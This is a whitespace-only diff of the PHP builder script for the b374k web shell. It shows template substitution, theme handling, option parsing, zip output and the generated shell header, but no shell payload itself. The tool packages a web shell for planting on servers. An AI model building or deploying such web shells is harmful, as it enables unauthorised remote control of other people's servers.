@@ -101,7 +101,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 
 		$layout = str_replace("<__CSS__>", $css_code, $layout);
 		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
-		
+
 		if($strip=='yes') $js_code = packer_pack_js($js_code);
 		$layout = str_replace("<__JS__>", $js_code, $layout);
 
@@ -112,7 +112,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 		packer_output(packer_b374k($outputfile, $phpcode, $htmlcode, $strip, $base64, $compress, $compress_level, $password));
 	}
 	else{
-	
+
 	$available_themes = "<tr><td>Theme</td><td><select class='theme' style='width:150px;'>";
 	foreach($GLOBALS['packer']['theme'] as $k){
 		if($k==$theme) $available_themes .= "<option selected='selected'>".$k."</option>";
@@ -236,7 +236,7 @@ if(isset($_SERVER['REMOTE_ADDR'])){
 			});
 
 		});
-		
+
 		$('.theme').on('change', function(e){
 			$('.theme').val($(this).val());
 			set_cookie('packer_theme', $('.theme').val());
@@ -285,7 +285,7 @@ else{
 			echo $output;
 			die();
 		}
-		
+
 		if(isset($opt['k'])){
 			$output .= "available themes : ".implode(",", $GLOBALS['packer']['theme'])."\n\n";
 			echo $output;
@@ -309,7 +309,7 @@ else{
 			die();
 		}
 		$css_code = packer_read_file($GLOBALS['packer']['theme_dir'].$theme.".css");
-		
+
 		$modules = isset($opt['m'])? trim($opt['m']):implode(",", $GLOBALS['packer']['module']);
 		if(empty($modules)) $modules = array();
 		else $modules = explode("," ,$modules);
@@ -362,7 +362,7 @@ else{
 
 		$layout = str_replace("<__CSS__>", $css_code, $layout);
 		$layout = str_replace("<__ZEPTO__>", $zepto_code, $layout);
-		
+
 		if($strip=='yes') $js_code = packer_pack_js($js_code);
 		$layout = str_replace("<__JS__>", $js_code, $layout);
 
@@ -391,7 +391,7 @@ function packer_write_file($file, $content){
 	if($fh = @fopen($file, "wb")){
 		if(fwrite($fh, $content)!==false){
 			if(!class_exists("ZipArchive")) return true;
-			
+
 			if(file_exists($file.".zip")) unlink ($file.".zip");
 			$zip = new ZipArchive();
 			$filename = "./".$file.".zip";
@@ -513,7 +513,7 @@ function packer_b374k($output, $phpcode, $htmlcode, $strip, $base64, $compress, 
 	if(preg_match("/\\\$GLOBALS\['ver'\]\ *=\ *[\"']+([^\"']+)[\"']+/", $phpcode, $r)){
 		$version = $r[1];
 	}
-	
+
 	$header = "<?php
 /*
 	b374k shell ".$version."
